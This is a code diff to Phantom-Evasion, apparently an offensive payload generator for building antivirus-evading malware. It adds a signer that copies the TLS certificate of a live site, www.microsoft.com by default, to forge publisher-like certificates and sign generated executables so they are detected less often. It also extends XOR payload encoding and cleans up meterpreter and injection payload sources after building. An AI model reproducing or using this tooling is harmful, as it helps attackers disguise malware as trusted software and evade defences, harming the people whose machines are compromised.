@@ -25,6 +25,9 @@ import subprocess,sys
 import os,platform
 import random
 import string
+from OpenSSL import crypto
+#from sys import argv, platform
+import ssl
 from time import sleep 
 from shutil import rmtree
 from random import shuffle
@@ -157,6 +160,7 @@ def linux_isready():
         auto_check("apksigner")
         auto_check("metasploit-framework")
         auto_check("strip")
+        auto_check("osslsigncode")
         auto_check("wine")
 
         print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
@@ -190,6 +194,7 @@ def kali_parrot_isready():
     auto_setup("apksigner")
     auto_setup("metasploit-framework")
     auto_setup("strip")
+    auto_setup("osslsigncode")
     
     if wine_fastcheck() == True:
         sleep(0.2)
@@ -223,7 +228,7 @@ def ubuntu_isready():
     auto_setup("mingw-w64")
     auto_setup("pyinstaller")
     auto_setup("apksigner")
-    auto_setup("openssl")
+    auto_setup("osslsigncode")
     auto_setup("strip")
 
     miner_advisor()
@@ -320,7 +325,6 @@ def dependencies_checker():
         Enter2Continue()
 
 def strip_tease(Filename):
-    py_version=platform.python_version()
     print(bcolors.OCRA + bcolors.BOLD + "\n[>] Strip \n" + bcolors.ENDC + bcolors.ENDC)
     print("strip is a GNU utility to \"strip\" symbols from object files.\n")
     print("This is useful for minimizing their file size, streamlining them for distribution.\n")
@@ -336,6 +340,125 @@ def strip_tease(Filename):
         print(bcolors.GREEN + "\n[>] Stripping...\n"  + bcolors.ENDC)
         sleep(1)
         subprocess.call(['strip',Filename])
+
+def exe_signer(Filename):
+    print(bcolors.OCRA + bcolors.BOLD + "\n[>] Sign Executable \n" + bcolors.ENDC + bcolors.ENDC)
+    print("Online Certificate spoofer & Executabe signer (Lower rate of detection)\n")
+    RequireSign = YesOrNo(InputFunc("\n[>] Sign executable? (y/n):"))
+
+
+    if RequireSign == "True":
+
+        cert_dir = ""
+        cert_ready=False
+
+        if os.path.exists("Setup/Sign_certs") and (len(os.listdir("Setup/Sign_certs")) > 1):
+
+            NotNewCert = YesOrNo(InputFunc("\nCertificates directory is not empty , use already existing certificate? (y/n): "))
+
+            if NotNewCert == "True":
+
+                CertsList = os.listdir("Setup/Sign_certs")
+                SelectList=[]
+                ix=0
+                
+                for i in CertsList:
+                
+                    if ".pfx" in i:
+
+                        SelectList.append(i.replace(".pfx",""))
+
+                for ii in SelectList:
+
+                    ix+=1
+                    print("\n[" + str(ix) + "] " + ii)
+
+                print("\n[" + str(ix+1) + "] Create new certificate")
+
+                ANS=InputFunc("\n[>] Select a Certificate or create a new one: ")
+                ANS=int(ANS)-1
+
+                if (ANS >= 0) and (ANS < len(SelectList)):
+
+                    ClonedCert="Setup/Sign_certs/" + SelectList[ANS] + ".crt"
+                    ClonedKey = "Setup/Sign_certs/"  + SelectList[ANS] +  ".key"
+                    PfxFile = "Setup/Sign_certs/" + SelectList[ANS] + ".pfx"
+                    cert_ready=True
+
+        elif not os.path.exists("Setup/Sign_certs"):
+
+                os.makedirs("Setup/Sign_certs")
+
+                      
+        if not cert_ready:
+
+            data = InputFunc("\n[>] Insert certificate spoofing target (default: www.microsoft.com:443): ")
+
+
+            if data == "":
+
+                host = "www.microsoft.com"
+                port = 443
+
+            else:
+
+                host = data.split(":")[0]
+                port = int(data.split(":")[1])
+
+            online_cert = ssl.get_server_certificate((host,port))
+            x509 = crypto.load_certificate(crypto.FILETYPE_PEM, online_cert)
+            keygen = crypto.PKey()
+            keygen.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
+            cert = crypto.X509()
+
+            ClonedCert = "Setup/Sign_certs/" + host + ".crt"
+            ClonedKey = "Setup/Sign_certs/" + host + ".key"
+            PfxFile = "Setup/Sign_certs/" + host + ".pfx"
+
+            cert.set_version(x509.get_version())
+            cert.set_serial_number(x509.get_serial_number())
+            cert.set_subject(x509.get_subject())
+            cert.set_issuer(x509.get_issuer())
+            cert.set_notBefore(x509.get_notBefore())
+            cert.set_notAfter(x509.get_notAfter())
+            cert.set_pubkey(keygen)
+            cert.sign(keygen, 'sha256')
+            pfx = crypto.PKCS12Type()
+            pfx.set_privatekey(keygen)
+            pfx.set_certificate(cert)
+            pfxdata = pfx.export()
+            open(ClonedCert, "wt").write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode('utf-8'))
+            open(ClonedKey, "wt").write(crypto.dump_privatekey(crypto.FILETYPE_PEM, keygen).decode('utf-8'))
+            open((PfxFile), 'wb').write(pfxdata)
+
+            sleep(2)
+
+        descr = InputFunc("\n[>] Insert sign software description (default: Notepad Benchmark Util): ")
+
+        if descr == "":
+
+            descr = "Notepad Benchmark Util"
+
+        if (platform.system() == "Windows"):
+
+            print("\n[>] Signing " + Filename + " with signtool.exe...")
+            print(subprocess.check_output("signtool.exe sign /v /f " + PfxFile + " /d \"" + descr + "\" /tr \"http://sha256timestamp.ws.symantec.com/sha256/timestamp\" /td SHA256 /fd SHA256 " + Filename, shell=True).decode())
+
+        else:
+            Fileform=Filename.split(".")
+            Tmpfile="Ready2Sign." + Fileform[len(Fileform)-1]
+            os.rename(Filename,Tmpfile)
+            print("\n[>] Signing " + Filename + " with osslsigncode...")
+            args = ("osslsigncode", "sign", "-pkcs12", PfxFile, "-n", descr, "-i", "http://sha256timestamp.ws.symantec.com/sha256/timestamp", "-in", Tmpfile, "-out",Filename)
+            popen = subprocess.Popen(args, stdout=subprocess.PIPE)
+            popen.wait()
+            output = popen.stdout.read()
+            os.remove(Tmpfile)
+            sleep(1)
+            print("\n[>] " + output.decode('utf-8'))
+            sleep(0.2)
+
+
 
 def wine_fastcheck():
 
@@ -584,11 +707,11 @@ def advisor():
     sleep(0.2)
     print(bcolors.RED + "[+] GITHUB: " + bcolors.ENDC + "https://github.com/oddcod3 \n")
     sleep(0.2)
-    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "2.0 \n")
+    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "2.0.1 \n")
     sleep(0.2)
     print(bcolors.RED + "[+] MODULES: " + bcolors.ENDC + "51\n")
     sleep(0.2)
-    print(bcolors.RED + "[+] NEW FEATURES: " + bcolors.ENDC + "C meterpreter reverse https stager, Thread hijack & PE inject modules  \n")
+    print(bcolors.RED + "[+] NEW FEATURES: " + bcolors.ENDC + "C meterpreter reverse https stager, Thread hijack & PE inject modules, Exe signer with online certificate spoofer  \n")
   
 
     sleep(3)
@@ -608,7 +731,7 @@ def banner():
     bann += "                |_|   / _ \ \ / / _` / __| |/ _ \| '_ \           \n"
     bann += "                     |  __/\ V / (_| \__ \ | (_) | | | |          \n"
     bann += "                      \___| \_/ \__,_|___/_|\___/|_| |_|          \n"
-    bann += "                                                        v2.0      \n"
+    bann += "                                                        v2.0.1    \n"
     sleep(0.3)
     print(bcolors.RED + bcolors.BOLD + bann  + bcolors.ENDC + bcolors.ENDC)
   
@@ -1056,7 +1179,7 @@ def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
 
                     Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-f','psh'])
 
-    return str(Payload)
+    return Payload
 
         
 def custom_payload_completer(custom_shellcode): 
@@ -1114,6 +1237,10 @@ def auto_compiler(module_type,arch,filename,link = ""):
 
         strip_tease(filename)
 
+        if ".exe" in filename:
+
+            exe_signer(filename)
+
     elif Os_used == "Windows":
 
         if "windows" in module_type and arch == "x86":
@@ -1153,6 +1280,10 @@ def auto_compiler(module_type,arch,filename,link = ""):
         elif "linux" in module_type and arch == "x64":
 
             print("Autocompile not supported use cygwin to compile source code")
+
+        if ".exe" in filename:
+
+            exe_signer(filename)
 
  
 
@@ -1230,8 +1361,13 @@ def module_launcher1(module_choice):
 
     output_filename = InputFunc("\n[>] Enter output filename: ")     
 
-    Procnumb=require_multiproc()
-        
+    if "windows" in payload_choice:
+
+        Procnumb=require_multiproc()
+
+    else:
+
+        Procnumb=0    
 
     module_where = "Modules/payloads/" + module_choice
 
@@ -1287,6 +1423,16 @@ def module_launcher1(module_choice):
     sleep(2)
 
     auto_compiler(module_choice,Arc,output_filename)
+
+    try:
+
+        os.remove("Source.c")
+        os.remove("payload.txt")
+
+    except:
+
+        pass
+
     print("\n[<>] File saved in Phantom-Evasion folder")
     Enter2Continue()
 
@@ -1332,6 +1478,9 @@ def module_launcher2(module_choice):
 
     Payload = custom_payload_completer(custom_shellcode)
 
+    with open("payload.txt","w") as payload_file:
+        payload_file.write(Payload)
+
     enc_type = encoding_selection_custom()
 
     Procnumb = require_multiproc()        
@@ -1340,17 +1489,25 @@ def module_launcher2(module_choice):
 
     if "ThreadExecutionHijack" in module_choice:
 
-        subprocess.call(['python',module_choice,Payload,Procnumb,enc_type,Proc_arch,Proc_target])
+        subprocess.call(['python',module_choice,Procnumb,enc_type,Proc_arch,Proc_target])
 
     elif "ProcessInject" in module_choice:
 
-        subprocess.call(['python',module_choice,Payload,Procnumb,enc_type,Proc_target])
+        subprocess.call(['python',module_choice,Procnumb,enc_type,Proc_target])
 
     else:
-        subprocess.call(['python',module_choice,Payload,Procnumb,enc_type])
+        subprocess.call(['python',module_choice,Procnumb,enc_type])
 
     if enc_type == "2":
         print(bcolors.GREEN + "\n[>] Xor multibyte encoding...\n" + bcolors.ENDC)
+        sleep(0.5)
+
+    if enc_type == "3":
+        print(bcolors.GREEN + "\n[>] Double-key Xor multibyte encoding...\n" + bcolors.ENDC)
+        sleep(0.5)
+
+    if enc_type == "4":
+        print(bcolors.GREEN + "\n[>] Triple-key Xor multibyte encoding...\n" + bcolors.ENDC)
         sleep(0.5)     
 
     print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)
@@ -1358,6 +1515,14 @@ def module_launcher2(module_choice):
     sleep(2)
 
     auto_compiler(module_choice,arch,output_filename)
+    try:
+
+        os.remove("Source.c")
+        os.remove("payload.txt")
+
+    except:
+
+        pass
     print("\n[<>] File saved in Phantom-Evasion folder!\n")
     sleep(3)
 
@@ -1424,7 +1589,6 @@ def require_multiproc():
     print("consequentialy.\n")
     print("Only the last spawned process will reach the malicious section of code")
     print("while the other decoy processes spawned before will executes only random junk code")
-    print("PRO: Longer execution time,Lower rate of detection.")
 
     ans=YesOrNo(InputFunc("\n[>] Add multiple processes behaviour?(y/n): "))
 
@@ -1573,6 +1737,15 @@ def powershell_launcher2(module_choice):
     sleep(2)
 
     auto_compiler(module_choice,arch,output_filename)
+
+    try:
+
+        os.remove("Source.c")
+
+    except:
+
+        pass
+
     print("\n[<>] File saved in Phantom-Evasion folder!\n")
     sleep(3)
 
@@ -1655,6 +1828,14 @@ def Polymorphic_C_Meterpreter_launcher(module_type):
 
     auto_compiler("windows",Arch,OUTFILE,link)
 
+    try:
+
+        os.remove("Source.c")
+
+    except:
+
+        pass
+
     print("\n[<>] File saved in Phantom-Evasion folder\n")
     Enter2Continue()
     
@@ -1663,7 +1844,7 @@ def BashOnelinerDropper():
     clear()
 
     Bash_payload=InputFunc("\n[>] Insert Bash online payload: ")
-    arch = InputFunc("\n[>] Enter resulting arch format  (x86 or x64)  : ")
+    arch = InputFunc("\n[>] Insert compiler option (x86 or x64)  : ")
     output_filename = InputFunc("\n[>] Enter output filename: ")
   
 
@@ -1672,16 +1853,25 @@ def BashOnelinerDropper():
     sleep(1)    
     if platform.system() == "Windows":
             
-        subprocess.call(['py','Modules/payloads/Polymorphic_BashOnelinerDropper_mathinject_linux.py',Bash_payload],shell=True)
+        subprocess.call(['py','Modules/payloads/ShellcmdDropper_linux.py',Bash_payload],shell=True)
     else:
             
-        subprocess.call(['python','Modules/payloads/Polymorphic_BashOnelinerDropper_mathinject_linux.py',Bash_payload])
+        subprocess.call(['python','Modules/payloads/ShellcmdDropper_linux.py',Bash_payload])
 
     sleep(0.5)
 
     print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)
 
     auto_compiler("linux",arch,output_filename,False)
+
+    try:
+
+        os.remove("Source.c")
+
+    except:
+
+        pass
+
 
     print("\n[<>] File saved in Phantom-Evasion folder\n")
     Enter2Continue()
